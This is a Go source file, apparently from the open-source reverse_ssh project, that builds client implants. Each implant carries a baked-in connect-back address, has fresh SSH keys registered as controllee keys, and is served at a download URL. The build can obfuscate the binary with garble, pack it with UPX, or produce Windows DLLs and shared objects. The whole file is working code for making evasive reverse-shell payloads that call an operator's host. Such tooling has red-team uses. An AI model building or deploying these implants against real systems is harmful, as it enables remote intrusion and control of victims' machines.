package webserver

import (
	"bytes"
	"errors"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/NHAS/reverse_ssh/internal"
	"github.com/NHAS/reverse_ssh/internal/server/data"
	"github.com/NHAS/reverse_ssh/pkg/trie"
	"golang.org/x/crypto/ssh"
)

var (
	Autocomplete = trie.NewTrie()

	cachePath string

	validPlatforms = make(map[string]bool)
	validArchs     = make(map[string]bool)
)

type BuildConfig struct {
	Name, Comment, Owners string

	GOOS, GOARCH, GOARM string

	ConnectBackAdress, Fingerprint string

	Proxy, SNI string

	SharedLibrary bool
	UPX           bool
	Garble        bool
	DisableLibC   bool
}

func Build(config BuildConfig) (string, error) {
	if !webserverOn {
		return "", errors.New("web server is not enabled")
	}

	if len(config.GOARCH) != 0 && !validArchs[config.GOARCH] {
		return "", fmt.Errorf("GOARCH supplied is not valid: " + config.GOARCH)
	}

	if len(config.GOOS) != 0 && !validPlatforms[config.GOOS] {
		return "", fmt.Errorf("GOOS supplied is not valid: " + config.GOOS)
	}

	if len(config.Fingerprint) == 0 {
		config.Fingerprint = defaultFingerPrint
	}

	if config.UPX {
		_, err := exec.LookPath("upx")
		if err != nil {
			return "", errors.New("upx could not be found in PATH")
		}
	}

	buildTool := "go"
	if config.Garble {
		_, err := exec.LookPath("garble")
		if err != nil {
			return "", errors.New("garble could not be found in PATH")
		}
		buildTool = "garble"
	}

	var f data.Download

	f.CallbackAddress = config.ConnectBackAdress

	filename, err := internal.RandomString(16)
	if err != nil {
		return "", err
	}

	if len(config.Name) == 0 {
		config.Name, err = internal.RandomString(16)
		if err != nil {
			return "", err
		}
	}

	f.Goos = runtime.GOOS
	if len(config.GOOS) > 0 {
		f.Goos = config.GOOS
	}

	f.Goarch = runtime.GOARCH
	if len(config.GOARCH) > 0 {
		f.Goarch = config.GOARCH
	}

	f.Goarm = config.GOARM

	f.FilePath = filepath.Join(cachePath, filename)
	f.FileType = "executable"
	f.Version = internal.Version + "_guess"

	repoVersion, err := exec.Command("git", "describe", "--tags").CombinedOutput()
	if err == nil {
		f.Version = string(repoVersion)
	}

	var buildArguments []string
	if config.Garble {
		buildArguments = append(buildArguments, "-tiny", "-literals")
	}

	buildArguments = append(buildArguments, "build", "-trimpath")

	if config.SharedLibrary {
		buildArguments = append(buildArguments, "-buildmode=c-shared")
		buildArguments = append(buildArguments, "-tags=cshared")
		f.FileType = "shared-object"
		if f.Goos != "windows" {
			f.FilePath += ".so"
		} else {
			f.FilePath += ".dll"
		}

	}

	newPrivateKey, err := internal.GeneratePrivateKey()
	if err != nil {
		return "", err
	}

	sshPriv, err := ssh.ParsePrivateKey(newPrivateKey)
	if err != nil {
		return "", err
	}

	err = os.WriteFile(filepath.Join(projectRoot, "internal/client/keys/private_key"), newPrivateKey, 0600)
	if err != nil {
		return "", err
	}

	publicKeyBytes := ssh.MarshalAuthorizedKey(sshPriv.PublicKey())

	err = os.WriteFile(filepath.Join(projectRoot, "internal/client/keys/private_key.pub"), publicKeyBytes, 0600)
	if err != nil {
		return "", err
	}

	buildArguments = append(buildArguments, fmt.Sprintf("-ldflags=-s -w -X main.destination=%s -X main.fingerprint=%s -X main.proxy=%s -X main.customSNI=%s -X github.com/NHAS/reverse_ssh/internal.Version=%s", config.ConnectBackAdress, config.Fingerprint, config.Proxy, config.SNI, strings.TrimSpace(f.Version)))
	buildArguments = append(buildArguments, "-o", f.FilePath, filepath.Join(projectRoot, "/cmd/client"))

	cmd := exec.Command(buildTool, buildArguments...)

	if config.DisableLibC {
		cmd.Env = append(os.Environ(), "CGO_ENABLED=0")
	}

	cmd.Env = append(cmd.Env, os.Environ()...)
	cmd.Env = append(cmd.Env, "GOOS="+f.Goos)
	cmd.Env = append(cmd.Env, "GOARCH="+f.Goarch)
	if len(f.Goarm) != 0 {
		cmd.Env = append(cmd.Env, "GOARM="+f.Goarm)
	}

	//Building a shared object for windows needs some extra beans
	cgoOn := "0"
	if config.SharedLibrary {

		var crossCompiler string
		if (runtime.GOOS == "linux" || runtime.GOOS == "darwin") && f.Goos == "windows" && f.Goarch == "amd64" {
			crossCompiler = "x86_64-w64-mingw32-gcc"
		}

		cmd.Env = append(cmd.Env, "CC="+crossCompiler)
		cgoOn = "1"
	}

	cmd.Env = append(cmd.Env, "CGO_ENABLED="+cgoOn)

	output, err := cmd.CombinedOutput()
	if err != nil {
		if strings.Contains(err.Error(), "garble") && strings.Contains(err.Error(), "x86_64-w64-mingw32-ld") && strings.Contains(err.Error(), "undefined reference to") {
			// Try to recover if the linking fails by clearing the cache
			if cleanErr := exec.Command("go", "clean", "-cache").Run(); cleanErr != nil {
				return "", fmt.Errorf("Error (was unable to automatically clean cache): " + err.Error() + "\n" + string(output))
			}
			output, err = cmd.CombinedOutput()
			if err != nil {
				return "", fmt.Errorf("Error: " + err.Error() + "\n" + string(output))
			}
		} else {
			return "", fmt.Errorf("Error: " + err.Error() + "\n" + string(output))
		}
	}

	f.UrlPath = config.Name

	err = data.CreateDownload(f)
	if err != nil {
		return "", err
	}

	if config.UPX {
		output, err := exec.Command("upx", "-qq", "-f", f.FilePath).CombinedOutput()
		if err != nil {
			return "", errors.New("unable to run upx: " + err.Error() + ": " + string(output))
		}
	}

	os.Chmod(f.FilePath, 0600)

	Autocomplete.Add(config.Name)

	authorizedControlleeKeys, err := os.OpenFile(filepath.Join(cachePath, "../authorized_controllee_keys"), os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return "", errors.New("cant open authorized controllee keys file: " + err.Error())
	}
	defer authorizedControlleeKeys.Close()

	log.Println("lconfig.Owners", config.Owners)

	if _, err = authorizedControlleeKeys.WriteString(fmt.Sprintf("%s %s %s\n", "owner="+config.Owners, publicKeyBytes[:len(publicKeyBytes)-1], config.Comment)); err != nil {
		return "", errors.New("cant write newly generated key to authorized controllee keys file: " + err.Error())
	}

	return "http://" + DefaultConnectBack + "/" + config.Name, nil
}

func startBuildManager(_cachePath string) error {

	clientSource := filepath.Join(projectRoot, "/cmd/client")
	info, err := os.Stat(clientSource)
	if err != nil || !info.IsDir() {
		return fmt.Errorf("the server doesnt appear to be in {project_root}/bin, please put it there")
	}

	cmd := exec.Command("go", "tool", "dist", "list")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("unable to run the go compiler to get a list of compilation targets: %s", err)
	}

	platformAndArch := bytes.Split(output, []byte("\n"))

	for _, line := range platformAndArch {
		parts := bytes.Split(line, []byte("/"))
		if len(parts) == 2 {
			validPlatforms[string(parts[0])] = true
			validArchs[string(parts[1])] = true
		}
	}

	info, err = os.Stat(_cachePath)
	if os.IsNotExist(err) {
		err = os.Mkdir(_cachePath, 0700)
		if err != nil {
			return err
		}
		info, err = os.Stat(_cachePath)
		if err != nil {
			return err
		}
	}

	if !info.IsDir() {
		return errors.New("Filestore path '" + _cachePath + "' already exists, but is a file instead of directory")
	}

	cachePath = _cachePath

	return nil
}
